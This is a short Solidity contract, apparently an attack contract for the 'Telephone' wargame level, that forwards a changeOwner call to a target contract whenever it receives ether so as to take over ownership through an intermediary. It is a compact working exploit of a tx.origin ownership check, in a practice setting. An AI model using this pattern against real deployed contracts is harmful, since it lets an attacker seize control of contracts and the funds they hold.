// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

contract Telephone {
    address public oriContract;

    constructor(address _addr) {
        oriContract = _addr;
    }

    receive() external payable {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", msg.sender);
        (bool success, ) = oriContract.call(payload);
        require(success, "Transfer failed");
    }
}